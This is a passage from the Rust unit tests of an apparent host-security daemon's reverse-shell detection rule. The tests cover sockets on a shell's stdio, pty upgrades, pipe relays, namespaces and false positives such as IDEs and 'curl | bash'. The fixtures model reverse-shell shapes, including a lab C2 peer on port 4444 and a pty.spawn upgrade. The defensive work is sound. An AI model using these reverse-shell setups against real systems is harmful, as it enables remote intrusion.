            (3, "pipe:[7001]"), (4, "pipe:[7002]"), (9, "socket:[90001]"),
        ]);
        let t = table();
        let out = run(dir.path(), &t, "e-bash3", "monitor");
        assert_eq!(out.len(), 1, "the relay must be caught: {:?}", out);
        assert_eq!(out[0].meta.severity, "critical");
        assert!(out[0].hook.contains("pipes"), "{}", out[0].hook);
    }

    /// The reason rung 2 refuses to look at a parent's non-stdio fds: every
    /// editor and build tool holds sockets and spawns shells. What saves rung 3
    /// is the shell having been given a command -- so this must stay silent
    /// even though node holds both pipes AND the same socket.
    #[test]
    fn a_build_tool_running_bash_dash_c_is_not_a_relay() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5402, "pipe:[7001]", "pipe:[7002]", "pipe:[7002]");
        fds_many(dir.path(), 5400, &[
            (0, "/dev/pts/3"), (1, "/dev/pts/3"), (2, "/dev/pts/3"),
            (3, "pipe:[7001]"), (4, "pipe:[7002]"), (9, "socket:[90001]"),
        ]);
        let t = table();
        let out = run(dir.path(), &t, "e-bash4", "monitor");
        assert!(out.is_empty(), "`bash -c` was handed its work: {:?}", out);
    }

    /// `curl … | bash` is the pattern this rung would otherwise drown in: curl
    /// holds a real socket and feeds the shell's stdin. It is not a relay,
    /// because the loop is open -- the shell's stdout is the terminal.
    #[test]
    fn curl_piped_into_bash_is_not_a_relay_because_the_loop_is_open() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        // stdin is the pipe from curl; stdout is the terminal.
        fds(dir.path(), 5401, "pipe:[7001]", "/dev/pts/3", "/dev/pts/3");
        fds_many(dir.path(), 5400, &[
            (0, "/dev/pts/3"), (1, "pipe:[7001]"), (2, "/dev/pts/3"),
            (9, "socket:[90001]"),
        ]);
        let t = table();
        let out = run(dir.path(), &t, "e-bash3", "monitor");
        assert!(out.is_empty(), "one-way pipeline is not a channel: {:?}", out);
    }

    /// A language server talking to itself is the everyday case.
    #[test]
    fn a_loopback_peer_is_not_a_relay() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5401, "pipe:[7001]", "pipe:[7002]", "pipe:[7002]");
        fds_many(dir.path(), 5400, &[
            (3, "pipe:[7001]"), (4, "pipe:[7002]"), (9, "socket:[90002]"),
        ]);
        let t = table();
        let out = run(dir.path(), &t, "e-bash3", "monitor");
        assert!(out.is_empty(), "127.0.0.1 is not a reverse shell: {:?}", out);
    }

    /// Holding one end is a pipeline stage; holding both is a channel.
    #[test]
    fn a_parent_holding_only_one_pipe_end_is_not_a_relay() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5401, "pipe:[7001]", "pipe:[7002]", "pipe:[7002]");
        fds_many(dir.path(), 5400, &[
            (3, "pipe:[7001]"), (9, "socket:[90001]"),
        ]);
        let t = table();
        let out = run(dir.path(), &t, "e-bash3", "monitor");
        assert!(out.is_empty(), "only the inbound end is held: {:?}", out);
    }

    #[test]
    fn a_shell_given_work_is_told_apart_from_one_waiting_for_it() {
        assert!(waits_for_commands(""));
        assert!(waits_for_commands("-i"));
        assert!(waits_for_commands("-s"));
        assert!(waits_for_commands("--noprofile --norc -s"));
        assert!(!waits_for_commands("-c npm run build"));
        assert!(!waits_for_commands("script.sh"));
        assert!(!waits_for_commands("--noprofile /tmp/x.sh"));
        // Bundled short flags still carry the -c.
        assert!(!waits_for_commands("-ic 'id'"));
    }

    fn run(root: &Path, t: &ProcTable, exec_id: &str, mode: &str) -> Vec<Finding> {
        let c = cfg();
        let feeds = Feeds::default();
        let homes = vec!["/home/dan".to_string()];
        let ctx = RuleCtx {
            rarity: &crate::rarity::RarityStore::default(),
            cfg: &c,
            table: t,
            feeds: &feeds,
            homes: &homes,
            now: 1_000,
            mode,
            armed: &crate::rules::NO_RULES_ARMED,
            cred_read_sessions: &crate::rules::NO_CRED_SESSIONS,
        };
        let mut r = ShellStdioSocket {
            proc_root: root.to_path_buf(),
        };
        r.on_exec(&ExecEvent::default(), exec_id, &ctx)
    }

    #[test]
    fn a_shell_whose_stdin_is_a_lan_socket_is_critical_and_names_the_peer() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5100, "socket:[90001]", "socket:[90001]", "socket:[90001]");

        let f = run(dir.path(), &table(), "e-bash", "monitor");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].rule, ID);
        assert_eq!(f[0].meta.family, "shell");
        assert_eq!(
            f[0].meta.severity, "critical",
            "a LAN peer is the shape both of this project's own lab C2s had"
        );
        let ev = f[0].extra_evidence.join(" | ");
        assert!(ev.contains("192.168.1.14:4444"), "{}", ev);
        assert!(ev.contains("ESTABLISHED"), "{}", ev);
        assert!(ev.contains("fd 0, 1, 2"), "{}", ev);
        assert!(ev.contains("alacritty"), "the parent chain is evidence: {}", ev);
        let net = f[0].net.as_ref().expect("chain and scoring need the destination");
        assert_eq!(net.dst_ip, "192.168.1.14");
        assert_eq!(net.dst_port, 4444);
    }

    #[test]
    fn a_loopback_peer_is_medium_and_says_why() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5100, "socket:[90002]", "/dev/pts/3", "/dev/pts/3");

        let f = run(dir.path(), &table(), "e-bash", "monitor");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].meta.severity, "medium");
        let ev = f[0].extra_evidence.join(" | ");
        assert!(ev.contains("loopback"), "the evidence must justify the drop: {}", ev);
        assert!(ev.contains("127.0.0.1:4444"), "{}", ev);
        assert!(!f[0].extra_evidence.iter().any(|e| e.contains("fd 0, 1, 2")));
    }

    #[test]
    fn an_ipv6_peer_is_read_from_tcp6_and_a_mapped_loopback_is_still_local() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5100, "socket:[90004]", "socket:[90004]", "/dev/null");

        let f = run(dir.path(), &table(), "e-bash", "monitor");
        assert_eq!(f.len(), 1);
        assert_eq!(
            f[0].meta.severity, "medium",
            "::ffff:127.0.0.1 is loopback; Ipv6Addr::is_loopback alone says it is not"
        );
        let ev = f[0].extra_evidence.join(" | ");
        assert!(ev.contains("tcp6"), "the row must come from /proc/net/tcp6: {}", ev);
        assert!(ev.contains("0:0:0:0:0:ffff:7f00:1"), "{}", ev);
    }

    #[test]
    fn a_unix_socket_on_stdio_is_not_a_finding() {
        // systemd hands every service a journald socket for stdout and stderr.
        // If this fired, every shell in every unit would be a critical alert.
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5100, "/dev/null", "socket:[90003]", "socket:[90003]");
        assert!(run(dir.path(), &table(), "e-bash", "monitor").is_empty());
    }

    #[test]
    fn an_unresolvable_socket_inode_is_still_critical() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5100, "socket:[99999]", "/dev/null", "/dev/null");

        let f = run(dir.path(), &table(), "e-bash", "monitor");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].meta.severity, "critical");
        assert!(f[0].net.is_none(), "no peer is known, so none is claimed");
        assert!(f[0]
            .extra_evidence
            .iter()
            .any(|e| e.contains("in none of /proc/net")));
        assert!(
            !f[0].request_kill,
            "monitor mode never kills, and an unidentified peer never kills"
        );
    }

    /// The Claude Code statusline case, and the reason the rule above was
    /// overturned: a short-lived `sh -c` whose stdio was a socketpair, in
    /// moatd's own network namespace, whose socket closed before we looked.
    /// `/proc/net` was authoritative and the inode was not in it, so it is
    /// gone -- and a reverse shell's socket, by definition, is not.
    #[test]
    fn a_socket_that_closed_in_our_own_namespace_is_not_a_reverse_shell() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5100, "socket:[99999]", "/dev/null", "/dev/null");
        // Both moatd and the shell are in the same netns.
        for who in ["self", "5100"] {
            let ns = dir.path().join(who).join("ns");
            std::fs::create_dir_all(&ns).unwrap();
            symlink("net:[4026531840]", ns.join("net")).unwrap();
        }
        assert!(
            run(dir.path(), &table(), "e-bash", "monitor").is_empty(),
            "an inode that resolved nowhere, in our own namespace, has closed"
        );
    }

    /// A containerised shell is resolved against ITS OWN socket table.
    ///
    /// 2026-09-08, overnight: sixteen CRITICAL alerts, every one an npm
    /// postinstall inside a container image build, every one landing in the
    /// "belongs to another network namespace" branch that keeps the finding.
    /// `/proc/<pid>/net/*` is that namespace's table and moatd is root, so
    /// there is no need to guess.
    #[test]
    fn a_socket_is_resolved_in_the_processs_own_namespace() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5100, "socket:[90001]", "/dev/null", "/dev/null");
        // Our namespace knows nothing about inode 90001...
        std::fs::write(dir.path().join("net/tcp"), "  sl  local_address rem_address\n").unwrap();
        // ...but the process's own table has it, on loopback.
        let pnet = dir.path().join("5100").join("net");
        std::fs::create_dir_all(&pnet).unwrap();
        std::fs::write(
            pnet.join("tcp"),
            "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode\n                0: 0100007F:1F90 0100007F:C350 01 00000000:00000000 00:00000000 00000000  1000        0 90001\n",
        )
        .unwrap();

        let f = run(dir.path(), &table(), "e-bash", "monitor");
        assert_eq!(f.len(), 1, "still a finding: the socket is real and live");
        assert_eq!(
            f[0].meta.severity, "medium",
            "and resolved as LOOPBACK from the container's own table, not left unknown"
        );
    }

    /// The case that must keep firing: a shell in ANOTHER network namespace can
    /// hold a live socket that never appears in the host's /proc/net, so an
    /// unresolvable inode there proves nothing and the finding stands.
    #[test]
    fn a_socket_in_another_namespace_is_still_critical() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5100, "socket:[99999]", "/dev/null", "/dev/null");
        let mine = dir.path().join("self").join("ns");
        std::fs::create_dir_all(&mine).unwrap();
        symlink("net:[4026531840]", mine.join("net")).unwrap();
        let theirs = dir.path().join("5100").join("ns");
        std::fs::create_dir_all(&theirs).unwrap();
        symlink("net:[4026532999]", theirs.join("net")).unwrap();

        let f = run(dir.path(), &table(), "e-bash", "monitor");
        assert_eq!(f.len(), 1, "a container shell's socket is not visible to us");
        assert_eq!(f[0].meta.severity, "critical");
    }

    #[test]
    fn a_pty_over_the_parents_socket_is_the_upgrade_and_fires_high() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        // python holds the C2 socket on its own stdio and hands bash a pty.
        fds(dir.path(), 5200, "socket:[90001]", "socket:[90001]", "socket:[90001]");
        fds(dir.path(), 5201, "/dev/pts/7", "/dev/pts/7", "/dev/pts/7");

        let f = run(dir.path(), &table(), "e-bash2", "monitor");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].rule, ID, "same rule id: it is the same finding one step later");
        assert_eq!(f[0].meta.severity, "high");
        let ev = f[0].extra_evidence.join(" | ");
        assert!(ev.contains("pty.spawn"), "{}", ev);
        assert!(ev.contains("/dev/pts/7"), "{}", ev);
        assert!(ev.contains("192.168.1.14:4444"), "{}", ev);
        assert!(!f[0].request_kill, "the pty rung is one process removed and never kills");
    }

    #[test]
    fn a_parent_holding_a_socket_somewhere_else_is_the_ide_case_and_is_silent() {
        // The FP that would have killed this rule: Claude, VS Code and every
        // language server hold sockets and spawn shells all day. The
        // discriminator is the parent's STDIO, not its fd table.
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5200, "/dev/null", "/dev/pts/3", "/dev/pts/3");
        let fd7 = dir.path().join("5200/fd");
        symlink("socket:[90001]", fd7.join("7")).unwrap();
        fds(dir.path(), 5201, "/dev/pts/7", "/dev/pts/7", "/dev/pts/7");

        assert!(run(dir.path(), &table(), "e-bash2", "monitor").is_empty());
    }

    #[test]
    fn a_process_that_has_already_gone_reports_nothing() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        // No /proc/5100 at all. A reverse shell is long-lived, so this is not
        // a miss worth guessing about.
        assert!(run(dir.path(), &table(), "e-bash", "monitor").is_empty());
    }

    #[test]
    fn enforce_mode_asks_for_a_kill_and_monitor_mode_does_not() {
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5100, "socket:[90001]", "socket:[90001]", "socket:[90001]");

        let f = run(dir.path(), &table(), "e-bash", "monitor");
        assert!(!f[0].request_kill);
        assert!(f[0].extra_evidence.iter().any(|e| e.contains("monitor mode")));

        let f = run(dir.path(), &table(), "e-bash", "enforce");
        assert!(f[0].request_kill, "the engine does the killing, after verifying the pid");
        assert!(
            !f[0].extra_evidence.iter().any(|e| e.contains("monitor mode")),
            "the outcome line comes from the engine"
        );
    }

    #[test]
    fn a_non_shell_with_a_socket_on_stdio_is_not_this_rule() {
        // curl's stdout being a socket is a pipeline, not a reverse shell.
        let dir = tempfile::tempdir().unwrap();
        proc_root(dir.path());
        fds(dir.path(), 5300, "socket:[90001]", "socket:[90001]", "socket:[90001]");
        assert!(run(dir.path(), &table(), "e-curl", "monitor").is_empty());
    }

    #[test]
    fn the_rule_explains_itself_and_can_be_switched_off() {
        let r = ShellStdioSocket::default();
        assert_eq!(
            r.proc_root,
            Path::new(DEFAULT_PROC_ROOT),
            "under test the default root must not be the real /proc: see DEFAULT_PROC_ROOT"
        );
        let m = r.meta();
        assert_eq!(m.severity, "critical");
        assert_eq!(m.family, "shell");
        assert!(m.why.len() > 80);
        assert!(m.expected.len() > 80);
        assert!(m.actions.contains(&"ignore".to_string()));
        let mut c = cfg();
        assert!(r.enabled(&c));
        c.rules.shell_stdio_socket = false;
        assert!(!r.enabled(&c));
    }

    /// The real thing, end to end: a real listener, a real connected socket, a
    /// real `sh` holding it on fds 0 and 1, and the rule pointed at the real
    /// `/proc`.
    ///
    /// Live, not `#[ignore]`d: it needs nothing but loopback and `/bin/sh`, and
    /// the child is killed in a guard whose `Drop` runs on every exit path, so
    /// nothing outlives the test. The moatd running on this machine will see
    /// this process too and raise its own medium (loopback) finding — expected,
    /// harmless, and cheaper than the coverage is worth.
    #[test]
    fn a_real_shell_holding_a_real_socket_is_caught_against_the_real_proc() {
        use std::io::Read;
        use std::net::{TcpListener, TcpStream};
        use std::os::fd::OwnedFd;
        use std::process::{Child, Command, Stdio};

        struct Guard(Child);
        impl Drop for Guard {
            fn drop(&mut self) {
                let _ = self.0.kill();
                let _ = self.0.wait();
            }
        }

        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let client = TcpStream::connect(addr).unwrap();
        let (mut server, _) = listener.accept().unwrap();

        let dup = client.try_clone().unwrap();
        let child = Command::new("/bin/sh")
            .arg("-c")
            .arg("sleep 5")
            .stdin(Stdio::from(OwnedFd::from(client)))
            .stdout(Stdio::from(OwnedFd::from(dup)))
            .stderr(Stdio::null())
            .spawn()
            .unwrap();
        let pid = child.id();
        let guard = Guard(child);

        let mut t = ProcTable::new(8, 60);
        t.observe(&proc("e-me", std::process::id(), "/usr/bin/cargo", "test", None));
        t.observe(&proc("e-sh", pid, "/bin/sh", "-c sleep 5", Some("e-me")));

        let f = run(Path::new("/proc"), &t, "e-sh", "monitor");
        assert_eq!(f.len(), 1, "a real sh with a real socket on stdin must be seen");
        assert_eq!(f[0].meta.severity, "medium", "the peer is loopback");
        let ev = f[0].extra_evidence.join(" | ");
        assert!(
            ev.contains(&format!("127.0.0.1:{}", addr.port())),
            "the listener's port must be in the evidence: {}",
            ev
        );
        assert!(ev.contains("ESTABLISHED"), "{}", ev);

        drop(guard);
        // The socket dies with the shell, which is the other half of the claim.
        let mut buf = [0u8; 1];
        server
            .set_read_timeout(Some(std::time::Duration::from_secs(5)))
            .unwrap();
        let _ = server.read(&mut buf);
    }
}
